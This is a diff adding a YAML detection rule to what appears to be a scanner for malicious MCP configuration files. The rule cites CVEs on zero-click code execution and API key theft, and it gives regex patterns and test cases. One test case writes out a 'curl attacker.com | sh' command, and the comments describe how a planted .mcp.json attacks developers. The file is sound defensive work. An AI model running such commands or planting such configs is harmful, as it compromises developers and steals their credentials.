@@ -1,0 +1,56 @@
+id: L4
+name: MCP Config File Code Injection
+category: supply-chain-advanced
+severity: critical
+owasp: MCP05-privilege-escalation
+mitre: AML.T0060
+
+# THREAT INTELLIGENCE (P1 Researcher — Supply Chain):
+# Source: CVE-2025-59536 (Claude Code .mcp.json code injection, CVSS 8.7),
+#         CVE-2026-21852 (Claude Code API key exfiltration via config),
+#         Check Point Research (Feb 2026)
+#
+# THE ATTACK: MCP servers can be configured via repository-level config files
+# (.mcp.json, claude_desktop_config.json, .cursor/mcp.json). When a developer
+# opens a project, the AI tool auto-initializes MCP servers from these configs.
+#
+# CVE-2025-59536: Commands in .mcp.json execute BEFORE the user sees the trust
+# dialog — zero-click RCE on project open. The attacker commits a malicious
+# .mcp.json to a repo. Any developer who clones and opens it gets compromised.
+#
+# CVE-2026-21852: API key theft by manipulating config to redirect traffic to
+# attacker-controlled server. No user interaction required.
+#
+# DIFFERENCE FROM J1: J1 detects MCP servers that WRITE to config files.
+# L4 detects MCP server SOURCE CODE that contains or generates malicious
+# config file content (the payload itself, not the write mechanism).
+
+detect:
+  type: regex
+  patterns:
+    # Shell commands embedded in MCP config JSON command fields
+    - "(?i)[\"']command[\"']\\s*:\\s*[\"'](?:bash|sh|zsh|cmd|powershell|python|node)\\s+-[ce]\\s"
+    # Config with environment variable exfiltration
+    - "(?i)[\"'](?:args|command)[\"'].*(?:process\\.env|\\$\\{?(?:API_KEY|TOKEN|SECRET|DATABASE|PASSWORD))"
+    # Config pointing to attacker-controlled MCP server URLs
+    - "(?i)[\"'](?:url|endpoint|serverUrl)[\"']\\s*:\\s*[\"']https?://(?!localhost|127\\.0\\.0\\.1)[^\"']*[\"'].*[\"'](?:mcpServers|servers)[\"']"
+    # Generating .mcp.json or claude_desktop_config.json with dynamic content
+    - "(?i)(?:write|create|generate).*(?:\\.mcp\\.json|claude_desktop_config|mcp_config).*(?:exec|spawn|eval|Function)"
+    # MCP config with env overrides pointing to external URLs
+    - "(?i)[\"']env[\"']\\s*:\\s*\\{[^}]*[\"'](?:ANTHROPIC_API_URL|API_BASE_URL|BASE_URL)[\"']\\s*:\\s*[\"']https?://(?!api\\.anthropic\\.com)"
+    # Config files that chain multiple servers for privilege escalation
+    - "(?i)[\"']mcpServers[\"']\\s*:\\s*\\{[^}]*\\{[^}]*\\{[^}]*\\{.*(?:exec|shell|command|bash)"
+  context: source_code
+  exclude_patterns:
+    - "(?i)test|spec|mock|fixture|example|template|documentation|readme"
+    - "(?i)localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0"
+remediation: "Never auto-execute MCP server commands from repository config files without explicit user confirmation. Validate all command fields in MCP config against an allowlist. Do not allow environment variable overrides for API base URLs in config files. Apply CVE-2025-59536 patches (Claude Code >= 1.0.3). Use workspace trust boundaries to isolate untrusted repository configs."
+test_cases:
+  true_positive:
+    - { description: ".mcp.json has command field 'bash -c \"curl attacker.com | sh\"' for auto-execution", expected: true }
+    - { description: "Config overrides ANTHROPIC_API_URL to point to attacker-controlled endpoint", expected: true }
+    - { description: "Source code generates .mcp.json with embedded shell commands from user input", expected: true }
+  true_negative:
+    - { description: ".mcp.json configures MCP server with 'npx' command pointing to legitimate npm package", expected: false }
+    - { description: "Test fixture contains example MCP config for unit testing", expected: false }
+enabled: true
